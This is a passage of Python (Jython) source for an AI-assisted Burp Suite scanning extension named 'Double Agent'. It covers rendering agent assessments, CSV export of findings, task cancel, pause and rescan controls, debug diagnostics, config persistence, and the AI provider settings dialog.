                parts.append("SUMMARY: %s" % item.get("summary", ""))
            if item.get("user_context"):
                parts.append("USER CONTEXT: %s" % item.get("user_context"))
            parts.append("")

            if item.get("status") == "pending":
                parts.append("=" * 60)
                parts.append("WAITING FOR AI AGENT TO CLAIM THIS WORK ITEM")
                parts.append("=" * 60)
                parts.append("")
                parts.append("Agent should GET: http://%s:%d/api/agent/queue/%d" % (
                    self.agent_server_host, self.agent_server_port, item.get("id", 0)))
                parts.append("Then POST:         http://%s:%d/api/agent/queue/%d/claim" % (
                    self.agent_server_host, self.agent_server_port, item.get("id", 0)))
            else:
                parts.append("=" * 60)
                parts.append("AI AGENT ASSESSMENT")
                parts.append("=" * 60)
                parts.append(item.get("assessment") or "(no assessment yet)")
                parts.append("")

                test_results = item.get("test_results", [])
                if test_results:
                    parts.append("=" * 60)
                    parts.append("TEST RESULTS (%d)" % len(test_results))
                    parts.append("=" * 60)
                    for i, tr in enumerate(test_results, 1):
                        if isinstance(tr, dict):
                            parts.append("%d. [%s] %s" % (
                                i,
                                tr.get("outcome", "?"),
                                tr.get("title", tr.get("test", ""))
                            ))
                            if tr.get("detail"):
                                parts.append("   %s" % tr.get("detail", ""))
                            if tr.get("evidence"):
                                parts.append("   Evidence: %s" % tr.get("evidence", ""))
                        else:
                            parts.append("%d. %s" % (i, str(tr)))
                    parts.append("")

                evidence_items = item.get("evidence", [])
                if evidence_items:
                    parts.append("=" * 60)
                    parts.append("REPRODUCIBLE EVIDENCE (%d)" % len(evidence_items))
                    parts.append("=" * 60)
                    for i, ev in enumerate(evidence_items, 1):
                        if isinstance(ev, dict):
                            parts.append("%d. HTTP %s" % (i, ev.get("status_code", "?")))
                            if ev.get("request"):
                                parts.append("   Request: %s" % self._safe_ascii_text(ev.get("request", ""), 500))
                            if ev.get("response_snippet"):
                                parts.append("   Response: %s" % self._safe_ascii_text(ev.get("response_snippet", ""), 500))
                            if ev.get("notes"):
                                parts.append("   Notes: %s" % ev.get("notes", ""))
                        else:
                            parts.append("%d. %s" % (i, str(ev)))
                    parts.append("")

                if item.get("reproduction"):
                    parts.append("=" * 60)
                    parts.append("REPRODUCTION")
                    parts.append("=" * 60)
                    parts.append(item.get("reproduction"))
                    parts.append("")

                notes = item.get("notes", [])
                if notes:
                    parts.append("=" * 60)
                    parts.append("NOTES")
                    parts.append("=" * 60)
                    for n in notes:
                        if isinstance(n, dict):
                            parts.append("- %s" % n.get("note", str(n)))
                        else:
                            parts.append("- %s" % str(n))

            self.agentAssessmentText.setText("\n".join(parts))
            self.agentAssessmentText.setCaretPosition(0)
            elapsed_ms = int((time.time() - start) * 1000)
            if elapsed_ms > 250:
                self.stdout.println("[UI PERF] Agent detail render slow: %dms idx=%d chars=%d" % (
                    elapsed_ms, idx, len("\n".join(parts))))
        except Exception as e:
            self.stderr.println("[AGENT] Error updating assessment details: %s" % self._safe_ascii_text(e))

    def _exportSelectedCSV(self):
        """Export selected findings (or all if none selected) to a CSV file."""
        try:
            import csv
            from javax.swing import JFileChooser
            from javax.swing.filechooser import FileNameExtensionFilter

            chooser = JFileChooser()
            chooser.setDialogTitle("Export Findings to CSV")
            chooser.setFileFilter(FileNameExtensionFilter("CSV Files", ["csv"]))
            result = chooser.showSaveDialog(self.panel)
            if result != JFileChooser.APPROVE_OPTION:
                return

            path = chooser.getSelectedFile().getAbsolutePath()
            if not path.endswith(".csv"):
                path += ".csv"

            selected_rows = self.findingsTable.getSelectedRows()
            if len(selected_rows) > 0:
                model_rows = [self.findingsTable.convertRowIndexToModel(r) for r in selected_rows]
            else:
                model_rows = range(len(self.findings_list))

            with self.findings_lock_ui:
                to_export = []
                for model_row in model_rows:
                    if model_row < len(self.findings_list):
                        to_export.append(dict(self.findings_list[model_row]))

            with open(path, "wb") as f:
                writer = csv.writer(f)
                writer.writerow(["Discovered At", "URL", "Finding", "Severity", "Confidence",
                                 "Agent Status", "Agent Priority", "Agent Rationale", "Agent Updated At",
                                 "CWE", "OWASP", "Detail", "Evidence", "Remediation"])
                for finding in to_export:
                    writer.writerow([
                        finding.get("discovered_at", ""),
                        finding.get("url", ""),
                        finding.get("title", ""),
                        finding.get("severity", ""),
                        finding.get("confidence", ""),
                        finding.get("agent_status", ""),
                        finding.get("agent_priority", ""),
                        finding.get("agent_rationale", ""),
                        finding.get("agent_updated_at", ""),
                        finding.get("cwe", ""),
                        finding.get("owasp", ""),
                        finding.get("detail", ""),
                        finding.get("evidence", ""),
                        finding.get("remediation", "")
                    ])
            self.log_to_console("[EXPORT] Exported %d findings to %s" % (len(to_export), path))
        except Exception as e:
            self.stderr.println("[EXPORT] CSV export error: %s" % self._safe_ascii_text(e))

    # === Feature #5: Persist column widths ===
    def _get_column_widths(self):
        """Read current column widths from tables."""
        widths = {}
        saved = getattr(self, "_saved_column_widths", None)
        if isinstance(saved, dict):
            widths.update(saved)
        for name, attr in [("tasks", "taskTable"), ("findings", "findingsTable")]:
            try:
                table = getattr(self, attr, None)
                if table is None:
                    continue
                col_widths = []
                for i in range(table.getColumnModel().getColumnCount()):
                    col_widths.append(table.getColumnModel().getColumn(i).getWidth())
                widths[name] = col_widths
            except Exception:
                continue
        return widths

    def _add_column_resize_cursor(self, table):
        """Disable column reordering and add wider resize cursor zone."""
        from java.awt import Cursor
        from java.awt.event import MouseMotionAdapter

        header = table.getTableHeader()
        header.setReorderingAllowed(False)
        resize_zone = 10  # pixels from column edge

        class HeaderCursorListener(MouseMotionAdapter):
            def mouseMoved(self, e):
                try:
                    col = header.columnAtPoint(e.getPoint())
                    if col < 0:
                        header.setCursor(Cursor.getDefaultCursor())
                        return
                    rect = header.getHeaderRect(col)
                    right_edge = rect.x + rect.width
                    if abs(e.getX() - right_edge) <= resize_zone:
                        header.setCursor(Cursor(Cursor.E_RESIZE_CURSOR))
                        return
                    if col > 0:
                        left_edge = rect.x
                        if abs(e.getX() - left_edge) <= resize_zone:
                            header.setCursor(Cursor(Cursor.E_RESIZE_CURSOR))
                            return
                    header.setCursor(Cursor.getDefaultCursor())
                except:
                    pass

        header.addMouseMotionListener(HeaderCursorListener())

    def _restore_column_widths(self):
        """Restore saved column widths from config."""
        widths = getattr(self, "_saved_column_widths", None)
        if not widths:
            return
        for name, table in [("tasks", self.taskTable), ("findings", self.findingsTable)]:
            col_widths = widths.get(name, [])
            for i, w in enumerate(col_widths):
                if i < table.getColumnModel().getColumnCount():
                    try:
                        table.getColumnModel().getColumn(i).setPreferredWidth(int(w))
                    except:
                        pass

    def cancelAllTasks(self, event):
        """Cancel all running/queued tasks (kill switch)"""
        self.stdout.println("\n[CANCEL ALL] Cancelling all active tasks...")
        
        cancelled_count = 0
        with self.tasks_lock:
            for task in self.tasks:
                status = task.get("status", "")
                # Cancel anything that's not already done
                if "Completed" not in status and "Error" not in status and "Cancelled" not in status:
                    task["cancel_requested"] = True
                    task["status"] = "Cancelled"
                    task["end_time"] = time.time()
                    cancelled_count += 1
        with self.control_lock:
            self.pause_all = False
        
        self.stdout.println("[CANCEL ALL] Cancelled %d tasks" % cancelled_count)
        self._ui_dirty = True
        self.refreshUI()
    
    def pauseAllTasks(self, event):
        """Pause/Resume all running tasks"""
        with self.control_lock:
            should_pause = not self.pause_all
            self.pause_all = should_pause

        if should_pause:
            self.stdout.println("\n[PAUSE ALL] Pausing all active tasks...")
            with self.tasks_lock:
                for task in self.tasks:
                    status = task.get("status", "")
                    if ("Completed" not in status and
                        "Error" not in status and
                        "Cancelled" not in status and
                        "Skipped" not in status):
                        task["status"] = "Paused"
            self.stdout.println("[PAUSE ALL] All tasks paused")
        else:
            self.stdout.println("\n[RESUME ALL] Resuming all paused tasks...")
            with self.tasks_lock:
                for task in self.tasks:
                    status = task.get("status", "")
                    if "Paused" in status:
                        task["status"] = "Queued"
            self.stdout.println("[RESUME ALL] All tasks resumed")
        
        self._ui_dirty = True
        self.refreshUI()

    def _rescanSelectedTask(self):
        """Rescan the selected task from the Tasks table."""
        try:
            # Get selected row
            selected_row = self.taskTable.getSelectedRow()
            if selected_row < 0:
                self.stderr.println("[RESCAN] No task selected")
                return
            
            # Convert view row to model row (accounting for sorting)
            model_row = self.taskTable.convertRowIndexToModel(selected_row)
            
            # Get task data from the table model
            timestamp = self.taskTableModel.getValueAt(model_row, 0)
            task_type = self.taskTableModel.getValueAt(model_row, 1)
            url = self.taskTableModel.getValueAt(model_row, 2)
            status = self.taskTableModel.getValueAt(model_row, 3)
            
            self.stdout.println("[RESCAN] Rescanning task: %s (%s)" % (url, task_type))
            
            # Find the original task to get full details
            with self.tasks_lock:
                original_task = None
                for task in self.tasks:
                    if (task.get("timestamp") == timestamp and 
                        task.get("url") == url and
                        task.get("type") == task_type):
                        original_task = task
                        break
                
                if original_task is None:
                    self.stderr.println("[RESCAN] Could not find original task data")
                    return
                
                # Create new task as a copy
                new_task = {
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                    "type": original_task.get("type", "PASSIVE"),
                    "url": original_task.get("url", ""),
                    "status": "Queued",
                    "messageInfo": original_task.get("messageInfo"),
                    "analysis": original_task.get("analysis", ""),
                    "url_hash": None,
                    "start_time": None,
                    "end_time": None
                }
                
                # Mark original as rescan origin
                original_task["rescan_origin"] = True
                
                # Add to tasks list
                self.tasks.append(new_task)
                task_id = len(self.tasks) - 1
            
            with self.stats_lock:
                self.stats["total_requests"] += 1

            message_info = new_task.get("messageInfo")
            if message_info is None:
                self.updateTask(task_id, "Error (No Request)")
                self.stderr.println("[RESCAN] Original task has no request/response object to rescan")
                return

            # Start forced analysis thread so right-click rescan bypasses dedupe.
            with self._analysis_thread_lock:
                if self._active_analysis_threads >= self.MAX_QUEUED_ANALYSES:
                    self.updateTask(task_id, "Skipped (Queue Full)")
                    self.stderr.println("[RESCAN] Analysis queue full, skipping")
                    return
                self._active_analysis_threads += 1
                self.stdout.println("[THREAD] Counter incremented: %d/%d (RESCAN)" % (
                    self._active_analysis_threads, self.MAX_QUEUED_ANALYSES))
            t = threading.Thread(target=self.analyze_forced, args=(message_info, str(url), task_id))
            t.setDaemon(True)
            t.start()
            
            self.stdout.println("[RESCAN] Task %d queued for rescan" % task_id)
            self._ui_dirty = True
            self.refreshUI()
            
        except Exception as e:
            self.stderr.println("[RESCAN] Error: %s" % self._safe_ascii_text(e))
    
    def debugTasks(self, event):
        """Debug stuck/stalled tasks - provides detailed diagnostic information"""
        self.stdout.println("\n" + "="*60)
        self.stdout.println("[DEBUG] Task Status Diagnostic Report")
        self.stdout.println("="*60)
        
        current_time = time.time()
        
        with self.tasks_lock:
            total_tasks = len(self.tasks)
            active_tasks = []
            queued_tasks = []
            stuck_tasks = []
            
            for idx, task in enumerate(self.tasks):
                status = task.get("status", "Unknown")
                task_type = task.get("type", "Unknown")
                url = task.get("url", "Unknown")[:50]
                start_time = task.get("start_time", 0)
                
                # Calculate duration
                if start_time > 0:
                    duration = current_time - start_time
                else:
                    duration = 0
                
                # Categorize tasks
                if "Analyzing" in status or "Waiting" in status:
                    active_tasks.append((idx, task_type, status, duration, url))
                    
                    # Check if stuck (analyzing for >5 minutes)
                    if duration > 300:  # 5 minutes
                        stuck_tasks.append((idx, task_type, status, duration, url))
                
                elif "Queued" in status:
                    queued_tasks.append((idx, task_type, status, duration, url))
            
            # Print summary
            self.stdout.println("\n[DEBUG] Summary:")
            self.stdout.println("  Total Tasks: %d" % total_tasks)
            self.stdout.println("  Active (Analyzing/Waiting): %d" % len(active_tasks))
            self.stdout.println("  Queued: %d" % len(queued_tasks))
            self.stdout.println("  Stuck (>5 min): %d" % len(stuck_tasks))
            
            # Print active tasks
            if active_tasks:
                self.stdout.println("\n[DEBUG] Active Tasks:")
                for idx, task_type, status, duration, url in active_tasks[:10]:  # Show first 10
                    self.stdout.println("  [%d] %s | %s | %.1fs | %s" % 
                                      (idx, task_type, status, duration, url))
            
            # Print queued tasks
            if queued_tasks:
                self.stdout.println("\n[DEBUG] Queued Tasks:")
                for idx, task_type, status, duration, url in queued_tasks[:10]:
                    self.stdout.println("  [%d] %s | %s | %.1fs | %s" % 
                                      (idx, task_type, status, duration, url))
            
            # Print stuck tasks with detailed diagnostics
            if stuck_tasks:
                self.stdout.println("\n[DEBUG] WARNING: STUCK TASKS DETECTED:")
                for idx, task_type, status, duration, url in stuck_tasks:
                    self.stdout.println("  [%d] %s | %s | %.1f minutes | %s" % 
                                      (idx, task_type, status, duration/60, url))
                
                self.stdout.println("\n[DEBUG] Possible causes:")
                self.stdout.println("  1. AI request timeout (increase in Settings)")
                self.stdout.println("  2. Network issues (check connectivity)")
                self.stdout.println("  3. AI provider unavailable (test connection)")
                self.stdout.println("  4. Thread deadlock (restart Burp Suite)")
                self.stdout.println("\n[DEBUG] Recommended actions:")
                self.stdout.println("  - Click 'Stop Analysis' to clear stuck tasks")
                self.stdout.println("  - Check AI connection: Settings → Test Connection")
                self.stdout.println("  - Increase timeout: Settings → Advanced → AI Request Timeout")
                self.stdout.println("  - Check Console for error messages")
            
            # Check semaphore status
            self.stdout.println("\n[DEBUG] Threading Status:")
            self.stdout.println("  Analysis Workers: %d" % int(self.ANALYSIS_WORKERS))
            self.stdout.println("  AI Request Concurrency: %d" % int(self.AI_REQUEST_CONCURRENCY))
            self.stdout.println("  Analysis Backlog Limit: %d waiting+running" % int(self.MAX_QUEUED_ANALYSES))
            self.stdout.println("  Proxy Backlog Limit: %d waiting+running" % int(self.MAX_PROXY_QUEUED_ANALYSES))
            self.stdout.println("  Proxy Intake Interval: %.1fs" % float(self.PROXY_ANALYSIS_MIN_INTERVAL_SECONDS))
            self.stdout.println("  Rate Limit Delay: %.1fs" % self.min_delay)
            self.stdout.println("  Last Request: %.1fs ago" % (current_time - self.last_request_time))
            
            # Check if semaphore might be blocked
            if len(active_tasks) > 0 and len(queued_tasks) > 5:
                self.stdout.println("\n[DEBUG] Warning: Many queued tasks with active task")
                self.stdout.println("  This is normal - tasks are worker-bounded and rate-limited to prevent API overload")
                self.stdout.println("  Max parallel workers: %d | Global pacing: 1 request every %.1f seconds" %
                                    (int(self.ANALYSIS_WORKERS), self.min_delay))
        
        self.stdout.println("\n" + "="*60)
        self.stdout.println("[DEBUG] End of diagnostic report")
        self.stdout.println("="*60)
        
        self.refreshUI()
    
    def load_config(self):
        """Load configuration from disk"""
        try:
            import os
            if os.path.exists(self.config_file):
                # Tighten perms on any pre-existing config so a key saved before
                # this hardening (world-readable 0644) becomes owner-only now.
                try:
                    import stat
                    os.chmod(self.config_file, stat.S_IRUSR | stat.S_IWUSR)
                except Exception:
                    pass
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                
                # Load settings
                self.AI_PROVIDER = config.get("ai_provider", self.AI_PROVIDER)
                self.API_URL = config.get("api_url", self.API_URL)
                self.API_KEY = config.get("api_key", self.API_KEY)
                self.API_KEYS_PER_PROVIDER = config.get("api_keys_per_provider", {})
                self.MODEL = config.get("model", self.MODEL)
                # Legacy bedrock_access_key/secret_key/session_token ignored (bearer token used via API_KEY)
                self.MAX_TOKENS = config.get("max_tokens", self.MAX_TOKENS)
                try:
                    min_scan_tokens = int(getattr(self, "MIN_SCAN_OUTPUT_TOKENS", 4096))
                    if int(self.MAX_TOKENS) < min_scan_tokens:
                        self.stdout.println("[CONFIG] Max Tokens raised from %d to %d so passive JSON findings are not truncated" %
                                            (int(self.MAX_TOKENS), min_scan_tokens))
                        self.MAX_TOKENS = min_scan_tokens
                except:
                    self.MAX_TOKENS = int(getattr(self, "MIN_SCAN_OUTPUT_TOKENS", 4096))
                self.AI_REQUEST_TIMEOUT = config.get("ai_request_timeout", self.AI_REQUEST_TIMEOUT)
                try:
                    if str(self.AI_PROVIDER or "") == "Bedrock" and int(self.AI_REQUEST_TIMEOUT) < int(getattr(self, "MIN_BEDROCK_REQUEST_TIMEOUT", 120)):
                        old_timeout = int(self.AI_REQUEST_TIMEOUT)
                        self.AI_REQUEST_TIMEOUT = int(getattr(self, "MIN_BEDROCK_REQUEST_TIMEOUT", 120))
                        self.stdout.println("[CONFIG] Bedrock timeout raised from %ds to %ds to prevent false No AI Response errors" %
                                            (old_timeout, int(self.AI_REQUEST_TIMEOUT)))
                except:
                    self.AI_REQUEST_TIMEOUT = int(getattr(self, "MIN_BEDROCK_REQUEST_TIMEOUT", 120))
                try:
                    self.ANALYSIS_WORKERS = max(1, int(config.get("analysis_workers", self.ANALYSIS_WORKERS)))
                except:
                    self.ANALYSIS_WORKERS = 1
                try:
                    self.AI_REQUEST_CONCURRENCY = max(1, min(5, int(config.get("ai_request_concurrency", self.AI_REQUEST_CONCURRENCY))))
                except:
                    self.AI_REQUEST_CONCURRENCY = 2
                self.VERBOSE = config.get("verbose", self.VERBOSE)
                saved_theme = config.get("theme", self.THEME)
                self.THEME = saved_theme if saved_theme in ("Auto", "Light", "Dark") else "Auto"
                self.PASSIVE_SCANNING_ENABLED = config.get("passive_scanning_enabled", True)
                self.PROXY_DEDUPE_ENABLED = config.get("proxy_dedupe_enabled", True)
                self.PROJECT_ROOT_DIR = config.get("project_root_dir", self.PROJECT_ROOT_DIR)
                try:
                    self.MAX_QUEUED_ANALYSES = max(1, int(config.get("max_queued_analyses", self.MAX_QUEUED_ANALYSES)))
                except:
                    self.MAX_QUEUED_ANALYSES = 12
                try:
                    self.MAX_PROXY_QUEUED_ANALYSES = max(1, int(config.get("max_proxy_queued_analyses", self.MAX_PROXY_QUEUED_ANALYSES)))
                except:
                    self.MAX_PROXY_QUEUED_ANALYSES = 3
                try:
                    self.PROXY_ANALYSIS_MIN_INTERVAL_SECONDS = max(0.0, float(config.get("proxy_analysis_min_interval_seconds", self.PROXY_ANALYSIS_MIN_INTERVAL_SECONDS)))
                except:
                    self.PROXY_ANALYSIS_MIN_INTERVAL_SECONDS = 1.0
                self.PROXY_UI_LAZY_REFRESH = config.get("proxy_ui_lazy_refresh", True)
                self.PROJECT_WORKSPACE_DIR = config.get("project_workspace_dir", self.PROJECT_WORKSPACE_DIR)
                self.PORTSWIGGER_MCP_URL = config.get("portswigger_mcp_url", self.PORTSWIGGER_MCP_URL)
                
                # Load context enrichment settings
                self.CONTEXT_ENRICHMENT_ENABLED = config.get("context_enrichment_enabled", self.CONTEXT_ENRICHMENT_ENABLED)
                self.CONTEXT_NEIGHBOR_COUNT = config.get("context_neighbor_count", self.CONTEXT_NEIGHBOR_COUNT)
                self.CONTEXT_MAX_AGE_MINUTES = config.get("context_max_age_minutes", self.CONTEXT_MAX_AGE_MINUTES)
                self._saved_column_widths = config.get("column_widths", {})
                self.CUSTOM_SCAN_PROMPT = config.get("custom_scan_prompt", "")
                self.CUSTOM_FLOW_PROMPT = config.get("custom_flow_prompt", "")

                self.stdout.println("\n[CONFIG] Loaded saved configuration from %s" % self.config_file)
                self.stdout.println("[CONFIG] Provider: %s | Model: %s" % (self.AI_PROVIDER, self.MODEL))
            else:
                self.stdout.println("\n[CONFIG] No saved configuration found - using defaults")
                self.stdout.println("[CONFIG] Config will be saved to: %s" % self.config_file)
        except Exception as e:
            self.stderr.println("[!] Failed to load config: %s" % self._safe_ascii_text(e))
            self.stderr.println("[!] Using default settings")
    
    def save_config(self):
        """Save configuration to disk"""
        try:
            config = {
                "ai_provider": self.AI_PROVIDER,
                "api_url": self.API_URL,
                "api_key": self.API_KEY,
                "api_keys_per_provider": self.API_KEYS_PER_PROVIDER,
                "model": self.MODEL,
                "max_tokens": self.MAX_TOKENS,
                "ai_request_timeout": self.AI_REQUEST_TIMEOUT,
                "analysis_workers": self.ANALYSIS_WORKERS,
                "ai_request_concurrency": self.AI_REQUEST_CONCURRENCY,
                "verbose": self.VERBOSE,
                "theme": self.THEME,
                "passive_scanning_enabled": self.PASSIVE_SCANNING_ENABLED,
                "proxy_dedupe_enabled": self.PROXY_DEDUPE_ENABLED,
                "project_root_dir": self.PROJECT_ROOT_DIR,
                "max_queued_analyses": self.MAX_QUEUED_ANALYSES,
                "max_proxy_queued_analyses": self.MAX_PROXY_QUEUED_ANALYSES,
                "proxy_analysis_min_interval_seconds": self.PROXY_ANALYSIS_MIN_INTERVAL_SECONDS,
                "proxy_ui_lazy_refresh": self.PROXY_UI_LAZY_REFRESH,
                "project_workspace_dir": self.PROJECT_WORKSPACE_DIR,
                "portswigger_mcp_url": self.PORTSWIGGER_MCP_URL,
                "context_enrichment_enabled": self.CONTEXT_ENRICHMENT_ENABLED,
                "context_neighbor_count": self.CONTEXT_NEIGHBOR_COUNT,
                "context_max_age_minutes": self.CONTEXT_MAX_AGE_MINUTES,
                "column_widths": self._get_column_widths(),
                "custom_scan_prompt": self.CUSTOM_SCAN_PROMPT,
                "custom_flow_prompt": self.CUSTOM_FLOW_PROMPT,
                "version": self.VERSION,
                "last_saved": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            
            with open(self.config_file, 'w') as f:
                json.dump(config, f, indent=2)

            # The config holds the AI provider API key in plaintext. We do not
            # encrypt it (that needs key management with its own failure modes),
            # but we restrict the file to owner-only (0600) so it isn't world-
            # readable on a shared host. Best-effort; no-op on platforms without
            # POSIX perms.
            try:
                import os, stat
                os.chmod(self.config_file, stat.S_IRUSR | stat.S_IWUSR)
            except Exception:
                pass

            self.stdout.println("[CONFIG] Configuration saved to %s (owner-only perms)" % self.config_file)
            return True
        except Exception as e:
            self.stderr.println("[!] Failed to save config: %s" % self._safe_ascii_text(e))
            return False

    def save_findings(self):
        """Persist findings to double-agent.json in the working directory.
        double-agent.json is the source of truth - see _persist_double_agent_file."""
        try:
            self._persist_double_agent_file()
        except Exception as e:
            self.stderr.println("[FINDINGS] Save error: %s" % self._safe_ascii_text(e))

    def load_findings(self):
        """Restore findings and FP suppression list.

        Source priority:
          1. double-agent.json in the working directory (primary, source of truth)
          2. Burp project storage (legacy compressed or plain-JSON)
          3. ~/.double-agent/ sidecar fallback or ~/.double_agent/ legacy files
        """
        try:
            data = None
            doc = self._read_double_agent_file()
            if doc and isinstance(doc, dict) and ("findings" in doc or "agent_queue" in doc):
                # double-agent.json carries findings + agent_queue together; queue is
                # restored separately by load_agent_queue from the same doc.
                data = {
                    "findings": doc.get("findings", []),
                    "fp_suppressed": doc.get("fp_suppressed", []),
                    "passive_scan_cache": doc.get("passive_scan_cache", {}),
                }
                self._double_agent_doc_cache = doc

            if data is None:
                raw = self._load_setting("double_agent_findings")
                if not raw:
                    return
                decoded = self._decompress_payload(raw)
                if not decoded:
                    return
                data = json.loads(decoded)
                project_doc = {
                    "findings": data.get("findings", []),
                    "agent_queue": {"items": []},
                }
                if not self._persistence_doc_matches_current_context(project_doc, "Burp project storage double_agent_findings"):
                    return

            findings = data.get("findings", [])
            fp_list = data.get("fp_suppressed", [])
            for finding in findings:
                if "agent_status" not in finding:
                    finding["agent_status"] = "false_positive" if finding.get("fp", False) else "untouched"
                if "agent_priority" not in finding:
                    finding["agent_priority"] = "defer" if finding.get("fp", False) else ""
                if "agent_rationale" not in finding:
                    finding["agent_rationale"] = ""
                if "agent_updated_at" not in finding:
                    finding["agent_updated_at"] = ""
                if "active_test_recipe" not in finding:
                    finding["active_test_recipe"] = {}
                elif isinstance(finding.get("active_test_recipe"), dict) and finding.get("active_test_recipe"):
                    finding["active_test_recipe"] = self._normalize_active_test_recipe(
                        finding.get("active_test_recipe", {}), finding)
                else:
                    finding["active_test_recipe"] = {}
            with self.findings_lock_ui:
                self.findings_list = findings
                removed_duplicates = self._dedupe_existing_findings()
                deleted_already_covered_indices = self._prune_already_covered_findings()
                suppressed = set()
                for entry in fp_list:
                    try:
                        if len(entry) != 2:
                            continue
                        if entry[0] == "scanner":
                            suppressed.add(("scanner", str(entry[1])))
                        else:
                            suppressed.add((entry[0], frozenset(entry[1])))
                    except:
                        pass
                self.fp_suppressed = suppressed
            self.stdout.println("[FINDINGS] Restored %d finding(s)" % len(self.findings_list))
            self._load_passive_scan_cache(data.get("passive_scan_cache", {}))
            if deleted_already_covered_indices:
                self._deleted_finding_indices_pending_queue_remap = deleted_already_covered_indices
                self.stdout.println("[FINDINGS] Removed %d already-covered finding(s) from persisted findings" % len(deleted_already_covered_indices))
            if removed_duplicates:
                self.stdout.println("[DEDUP] Removed %d duplicate scanner finding(s) from persisted findings" % removed_duplicates)
            loaded_legacy_path = str(getattr(self, "_loaded_legacy_sidecar_path", "") or "")
            if loaded_legacy_path:
                self.stdout.println("[PERSIST] Imported legacy sidecar %s; will save canonical double-agent.json" % loaded_legacy_path)
                self._loaded_legacy_sidecar_path = ""
            if removed_duplicates or deleted_already_covered_indices or loaded_legacy_path:
                self._findings_load_cleanup_pending_save = True
        except Exception as e:
            self.stderr.println("[FINDINGS] Load error: %s" % self._safe_ascii_text(e))

    def openSettings(self, event):
        """Open settings dialog with AI provider and advanced configuration"""
        try:
            self._do_open_settings()
        except Exception as e:
            import traceback
            self.stderr.println("[SETTINGS ERROR] Failed to open settings dialog: %s" % str(e))
            self.stderr.println(traceback.format_exc())

    def _do_open_settings(self):
        """Internal method to create and show settings dialog"""
        from javax.swing import JDialog, JTabbedPane, JTextField, JComboBox, JPasswordField, JTextArea, JFileChooser
        from javax.swing import SwingConstants, JCheckBox
        from java.awt import GridBagLayout, GridBagConstraints, Insets

        def _estimate_openai_context_window(model_name):
            model_l = str(model_name or "").lower()
            if "gpt-4o" in model_l or "gpt-4.1" in model_l or "gpt-5" in model_l:
                return 128000
            if model_l.startswith("gpt-4"):
                return 8192
            if "gpt-3.5" in model_l:
                return 16385
            return 0

        # Debug: Log that settings is opening
        self.stdout.println("\n[SETTINGS] Opening configuration dialog...")
        self.stdout.println("[SETTINGS] Current Provider: %s" % self.AI_PROVIDER)
        self.stdout.println("[SETTINGS] Current Model: %s" % self.MODEL)
        
        dialog = JDialog()
        dialog.setTitle("Double Agent Settings")
        dialog.setModal(True)
        dialog.setSize(750, 650)  # Wider to accommodate long model names, taller for Advanced tab
        dialog.setLocationRelativeTo(None)
        
        tabbedPane = JTabbedPane()
        tabbedPane.setTabLayoutPolicy(JTabbedPane.SCROLL_TAB_LAYOUT)
        
        # AI PROVIDER TAB
        aiPanel = JPanel(GridBagLayout())
        gbc = GridBagConstraints()
        gbc.insets = Insets(5, 5, 5, 5)
        gbc.anchor = GridBagConstraints.WEST
        gbc.fill = GridBagConstraints.HORIZONTAL
        
        row = 0
        
        gbc.gridx = 0
        gbc.gridy = row
        aiPanel.add(JLabel("AI Provider:"), gbc)
        gbc.gridx = 1
        gbc.gridwidth = 2
        providerCombo = JComboBox(["Ollama", "OpenAI", "Claude", "Gemini", "Bedrock", "DeepSeek"])
        providerCombo.setSelectedItem(self.AI_PROVIDER)
        
        # Auto-update API URL when provider changes
        from java.awt.event import ActionListener
        class ProviderChangeListener(ActionListener):
            def __init__(self, extender, urlField):
                self.extender = extender
                self.urlField = urlField
            
            def actionPerformed(self, e):
                provider = str(e.getSource().getSelectedItem())
                # Default URLs for each provider
                default_urls = {
                    "Ollama": "http://localhost:11434",
                    "OpenAI": "https://api.openai.com/v1",
                    "Claude": "https://api.anthropic.com/v1",
                    "Gemini": "https://generativelanguage.googleapis.com/v1",
                    "Bedrock": "https://bedrock-runtime.us-east-1.amazonaws.com",
                    "DeepSeek": "https://api.deepseek.com/v1"
                }
                if provider in default_urls:
                    self.urlField.setText(default_urls[provider])
        
        aiPanel.add(providerCombo, gbc)
        gbc.gridwidth = 1
        row += 1
        
        gbc.gridx = 0
        gbc.gridy = row
        apiUrlLabel = JLabel("API URL:")
        aiPanel.add(apiUrlLabel, gbc)
        gbc.gridx = 1
        gbc.gridwidth = 2
        apiUrlField = JTextField(self.API_URL, 30)
        
        # Add listener AFTER creating the field
        providerCombo.addActionListener(ProviderChangeListener(self, apiUrlField))
        
        aiPanel.add(apiUrlField, gbc)
        gbc.gridwidth = 1
        row += 1
        
        gbc.gridx = 0
        gbc.gridy = row
        apiKeyLabel = JLabel("API Key:")
        aiPanel.add(apiKeyLabel, gbc)
        gbc.gridx = 1
        gbc.gridwidth = 2
        apiKeyField = JPasswordField(self.API_KEYS_PER_PROVIDER.get(self.AI_PROVIDER, self.API_KEY), 30)
        aiPanel.add(apiKeyField, gbc)
        gbc.gridwidth = 1
        row += 1

        # Bedrock uses hardcoded us-east-1 region - no UI field needed
        
        gbc.gridx = 0
        gbc.gridy = row
        modelLabel = JLabel("Model:")
        if self.AI_PROVIDER == "Bedrock":
            modelLabel.setText("Model (serverless only):")
            modelLabel.setToolTipText("Bedrock list is limited to ON_DEMAND foundation models and SYSTEM_DEFINED inference profiles.")
        aiPanel.add(modelLabel, gbc)
        gbc.gridx = 1
        if self.AI_PROVIDER == "OpenAI":
            cached_eligible = [m for m in self.available_models if _estimate_openai_context_window(m) >= 120000]
            if len(cached_eligible) > 0:
                models_to_show = cached_eligible
            elif _estimate_openai_context_window(self.MODEL) >= 120000:
                models_to_show = [self.MODEL]
            else:
                models_to_show = []
        elif self.AI_PROVIDER == "Bedrock":
            models_to_show = self._bedrock_serverless_models()
        else:
            models_to_show = self.available_models if self.available_models else [self.MODEL]
        modelCombo = JComboBox(models_to_show)
        if self.MODEL in models_to_show:
            modelCombo.setSelectedItem(self.MODEL)
        elif len(models_to_show) > 0:
            modelCombo.setSelectedItem(models_to_show[0])
        aiPanel.add(modelCombo, gbc)

        def updateModelComboForProvider():
            provider = str(providerCombo.getSelectedItem())
            previous_model = str(modelCombo.getSelectedItem() or "")
            modelCombo.removeAllItems()

            if provider == "OpenAI":
                eligible_models = [m for m in self.available_models if _estimate_openai_context_window(m) >= 120000]
                models = eligible_models
            elif provider == "Bedrock":
                models = self._bedrock_serverless_models()
                modelLabel.setText("Model (serverless only):")
                modelLabel.setToolTipText("Bedrock list is limited to ON_DEMAND foundation models and SYSTEM_DEFINED inference profiles.")
            else:
